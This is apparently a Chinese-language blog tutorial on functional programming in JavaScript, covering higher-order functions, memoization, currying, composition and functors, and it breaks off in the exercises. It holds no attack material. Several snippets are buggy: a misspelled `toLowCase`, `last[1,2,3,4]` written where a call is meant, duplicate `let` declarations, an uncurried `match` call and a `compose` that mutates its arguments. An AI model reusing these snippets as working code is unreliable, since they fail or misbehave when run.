        <content type="html"><![CDATA[<ul><li>什么是高阶函数</li><li>lodash</li><li>纯函数与记忆函数</li><li>函数柯里化</li><li>函数组合与Point Free</li><li>Functor（函子）</li><li>几道习题</li></ul><a id="more"></a><h2 id="什么是高阶函数"><a href="#什么是高阶函数" class="headerlink" title="什么是高阶函数"></a>什么是高阶函数</h2><ul><li>函数可以参数</li><li>函数可以作为返回值</li><li>作用：抽象通用的问题，例如过滤数组，可以通过函数参数任意设定过滤规则</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数作为参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">forEach</span> (<span class="params">array, fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">        fn(array[i])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">forEach(arr, <span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span> (<span class="params">array, fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; array.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(fn(array[i])) &#123;</span><br><span class="line">            res.push(array[i])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line">filter(arr, <span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item % <span class="number">2</span> === <span class="number">0</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数作为返回值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">once</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> done = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!done) &#123;</span><br><span class="line">            done = <span class="literal">true</span></span><br><span class="line">            <span class="comment">// return fn.apply(this, arguments)</span></span><br><span class="line">            <span class="comment">// return fn.apply(fn, arguments)</span></span><br><span class="line">            <span class="keyword">return</span> fn(...arguments)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> pay = once(<span class="function"><span class="keyword">function</span> (<span class="params">money</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`支付：<span class="subst">$&#123;money&#125;</span> RMB`</span>)</span><br><span class="line">&#125;)</span><br><span class="line">pay(<span class="number">5</span>)</span><br><span class="line">pay(<span class="number">5</span>)</span><br><span class="line">pay(<span class="number">5</span>)</span><br><span class="line">pay(<span class="number">5</span>) <span class="comment">//只执行一次</span></span><br></pre></td></tr></table></figure><ul><li>模拟常用高阶函数：map，every，some</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="function">(<span class="params">array, fn</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> res = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> array) &#123;</span><br><span class="line">        res.push(fn(value))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断数组中每一个元素是否匹配</span></span><br><span class="line"><span class="keyword">const</span> every = <span class="function">(<span class="params">array, fn</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> array) &#123;</span><br><span class="line">        res = fn(value)</span><br><span class="line">        <span class="keyword">if</span>(!res) <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line">every(arr, v =&gt; v &gt; <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断数组中的元素是否由一个匹配</span></span><br><span class="line"><span class="keyword">const</span> some = <span class="function">(<span class="params">array, fn</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> array) &#123;</span><br><span class="line">        res = fn(value)</span><br><span class="line">        <span class="keyword">if</span>(res) <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如何实现求任意次方的函数</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 浏览器设置断点调试闭包</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makePower</span> (<span class="params">power</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">number</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.pow(number, power)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//求平方</span></span><br><span class="line"><span class="keyword">let</span> power2 = makePower(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">let</span> power3 = makePower(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(power2(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h2 id="lodash-一个一致性、模块化、高性能的-JavaScript-实用工具库"><a href="#lodash-一个一致性、模块化、高性能的-JavaScript-实用工具库" class="headerlink" title="lodash:一个一致性、模块化、高性能的 JavaScript 实用工具库"></a>lodash:一个一致性、模块化、高性能的 JavaScript 实用工具库</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(_.first(array))</span><br><span class="line"><span class="built_in">console</span>.log(_.last(array))</span><br><span class="line"><span class="built_in">console</span>.log(_.toUpper(_.first(array)))</span><br></pre></td></tr></table></figure><h2 id="纯函数的三个条件："><a href="#纯函数的三个条件：" class="headerlink" title="纯函数的三个条件："></a>纯函数的三个条件：</h2><ul><li>给定输入，无论什么时候调用，无论调用多少次，输出总是确定的</li><li>在函数内部不可以改变函数外部对象的状态</li><li>不可以在函数内部共享函数外部的变量</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr.slice(<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">//[1,2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.slice(<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">//[1,2]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.splice(<span class="number">0</span>,<span class="number">2</span>)) <span class="comment">//[1,2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.splice(<span class="number">0</span>,<span class="number">2</span>)) <span class="comment">//[3,4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//根据第一条，slice是纯函数，splice不是</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数传进来的参数如果是对象的引用，会在内部改变该对象，则不是纯函数</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数取到了函数外的变量，不是纯函数</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">20</span> ;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &gt; num;</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">18</span>);</span><br></pre></td></tr></table></figure><p>纯函数优点：可记忆，可测试</p><p><strong>使用js记忆函数来计算菲波那切数列、阶乘等，可以极大减少我们必须要做的工作，加速程序计算。</strong> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArea</span> (<span class="params">r</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(r)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.PI * r *r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> getAreaWithMemory = _.memoize(getArea)</span><br><span class="line"><span class="built_in">console</span>.log(getAreaWithMemory(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">console</span>.log(getAreaWithMemory(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">console</span>.log(getAreaWithMemory(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 50..</span></span><br><span class="line"><span class="comment">// 50..</span></span><br><span class="line"><span class="comment">// 50..</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">memoize</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> cache = &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> key = <span class="built_in">JSON</span>.stringify(<span class="built_in">arguments</span>)</span><br><span class="line">        cache[key] = cache[key] || fn(...arguments) <span class="comment">// 不必重新执行</span></span><br><span class="line">        <span class="keyword">return</span> cache[key]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> getAreaWithMemory = memoize(getArea)</span><br><span class="line"><span class="built_in">console</span>.log(getAreaWithMemory(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">console</span>.log(getAreaWithMemory(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">console</span>.log(getAreaWithMemory(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h2 id="函数柯里化"><a href="#函数柯里化" class="headerlink" title="函数柯里化"></a>函数柯里化</h2><ul><li>对函数参数的缓存</li><li>让函数变得更灵活，让函数的粒度更小</li><li>把多元函数转换成一元函数，可以组合使用函数产生强大的功能</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> curry = <span class="function">(<span class="params">fn, ...args</span>) =&gt;</span> </span><br><span class="line">args.length &lt; fn.length</span><br><span class="line">       ? <span class="function">(<span class="params">...<span class="built_in">arguments</span></span>) =&gt;</span> curry(fn, ...args, ...arguments)</span><br><span class="line">   : fn(...args)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">plus</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b + c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> curryPlus = curry(plus)  <span class="comment">//这里给到一个有三个参数的函数</span></span><br><span class="line"><span class="built_in">console</span>.log(curryPlus(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>)) <span class="comment">//返回 6</span></span><br><span class="line"><span class="built_in">console</span>.log(curryPlus(<span class="number">1</span>)(<span class="number">2</span>,<span class="number">3</span>)) <span class="comment">//返回 6</span></span><br><span class="line"><span class="built_in">console</span>.log(curryPlus(<span class="number">1</span>,<span class="number">2</span>)(<span class="number">3</span>)) <span class="comment">//返回 6</span></span><br><span class="line"><span class="built_in">console</span>.log(curryPlus(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="comment">//返回 6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> curryPlus = curry(plus,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) </span><br><span class="line"><span class="built_in">console</span>.log(curryPlus) <span class="comment">// 6</span></span><br></pre></td></tr></table></figure><p>柯里化案例：正则表达式匹配字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span> (<span class="params">reg, str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str.match(reg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> matchPlus = curry(match)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断空白字符</span></span><br><span class="line"><span class="keyword">const</span> haveSpace = match(<span class="regexp">/\s+/g</span>)</span><br><span class="line"><span class="built_in">console</span>.log(haveSpace(<span class="string">'hello world'</span>))</span><br></pre></td></tr></table></figure><p>柯里化在Vue源码中的应用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/platform/web/patch.js</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPatch</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 一些操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">patch</span> (<span class="params">vdom1, vdom2</span>) </span>&#123;</span><br><span class="line">        ..</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> patch = createPatch(...)</span><br><span class="line">                          </span><br><span class="line"><span class="comment">// 这样就不必每次都patch参数里传obj了</span></span><br></pre></td></tr></table></figure><h2 id="函数组合"><a href="#函数组合" class="headerlink" title="函数组合"></a>函数组合</h2><p>洋葱代码：<code>tOUpper(first(reverse(arr))</code></p><p>可以用函数组合把细粒度的函数组合成一个新的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compose</span> (<span class="params">f, g</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> f(g(value))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数组合求数组中最后一个元素：先反转再获取第一个</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.reverse()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">first</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> last = compose(first, reverse)</span><br><span class="line"><span class="built_in">console</span>.log(last[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在lodash中调用 _.flowRight(fn1, fn2, fn3)</span></span><br></pre></td></tr></table></figure><p><strong>模拟实现</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.reverse()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">first</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toUpper</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.toUpperCase()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> f = compose(toUpper, first, reverse)</span><br><span class="line"><span class="built_in">console</span>.log(f([one,two,three])) <span class="comment">//THREE</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compose</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> args.reverse().reduce(<span class="function"><span class="keyword">function</span> (<span class="params">acc, cur</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> cur(acc)</span><br><span class="line">    &#125;, value)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>简化</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> compose = <span class="function">(<span class="params">...args</span>) =&gt;</span> value =&gt; args.reverse().reduce(<span class="function">(<span class="params">acc,fn</span>) =&gt;</span> fn(acc),value)</span><br></pre></td></tr></table></figure><h2 id="Point-Free模式：函数组合去实现"><a href="#Point-Free模式：函数组合去实现" class="headerlink" title="Point Free模式：函数组合去实现"></a>Point Free模式：函数组合去实现</h2><ul><li>不需要指明处理的数据</li><li>只需要合成运算过程</li><li>需要定义一些辅助的基本运算函数</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello World =&gt; hello_world</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params">word</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> word.toLowCase().replace(<span class="regexp">/\s+/g</span>,<span class="string">'_'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Point Free 模式</span></span><br><span class="line"><span class="keyword">const</span> f = compose(replace(<span class="regexp">/\s+/g</span>, <span class="string">'_'</span>), toLower)</span><br></pre></td></tr></table></figure><h2 id="Functor（函子）"><a href="#Functor（函子）" class="headerlink" title="Functor（函子）"></a>Functor（函子）</h2><ul><li>函子：可以认为函子是这样一个函数，它从一个容器中取出值， 并将其加工，然后放到一个新的容器中。这个函数的第一个输入的参数是类型的态射，第二个输入的参数是容器。 </li></ul><p>最简单的函子<code>map</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>].map(<span class="built_in">Math</span>.sqrt); <span class="comment">// Returns: [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>如何实现？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span> (value) &#123;</span><br><span class="line">        <span class="keyword">this</span>._value = value</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    map (fn) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Container(fn(<span class="keyword">this</span>._value))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = <span class="keyword">new</span> Container(<span class="number">5</span>)</span><br><span class="line">            .map(<span class="function"><span class="params">x</span> =&gt;</span> x + <span class="number">1</span>)</span><br><span class="line">            .map(<span class="function"><span class="params">x</span> =&gt;</span> x * x)</span><br><span class="line"><span class="built_in">console</span>.log(res) <span class="comment">// Container &#123; _value: 36 &#125;</span></span><br></pre></td></tr></table></figure><p>为了简化可以增加静态方法（静态方法：既可以通过类调用，也可以通过实例对象调用）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">of</span>(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Container(value)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>._value = value</span><br><span class="line">  &#125;</span><br><span class="line">  map(fn) &#123;</span><br><span class="line">    <span class="keyword">return</span> Container.of(fn(<span class="keyword">this</span>._value))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 取值</span></span><br><span class="line">  value(f) &#123;</span><br><span class="line">     <span class="keyword">return</span> f(<span class="keyword">this</span>._value)</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了处理参数为null和undefined的情况</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Maybe</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">of</span>(x) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Maybe(x)</span><br><span class="line">  &#125;</span><br><span class="line">  isNothing() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._value === <span class="literal">null</span> || <span class="keyword">this</span>._value ===<span class="literal">undefined</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">constructor</span>(x) &#123;</span><br><span class="line">    <span class="keyword">this</span>._value = x</span><br><span class="line">  &#125;</span><br><span class="line">  map(fn) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.isNothing() ? <span class="keyword">this</span> : Maybe.of(fn(<span class="keyword">this</span>._value))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把美元转换成人民币</span></span><br><span class="line"><span class="keyword">const</span> toRMB = <span class="function"><span class="params">s</span> =&gt;</span> Functor.of(s)</span><br><span class="line">.map(<span class="function"><span class="params">v</span> =&gt;</span> v.replace(<span class="string">'$'</span>, <span class="string">''</span>))</span><br><span class="line">.map(<span class="built_in">parseFloat</span>)</span><br><span class="line">.map(<span class="function"><span class="params">v</span> =&gt;</span> v * <span class="number">7</span>)</span><br><span class="line">.map(<span class="function"><span class="params">v</span> =&gt;</span> v.toFixed(<span class="number">2</span>))</span><br><span class="line">.value(<span class="function"><span class="params">v</span> =&gt;</span> <span class="string">'￥'</span> + v)</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h2 id="几道习题"><a href="#几道习题" class="headerlink" title="几道习题"></a>几道习题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 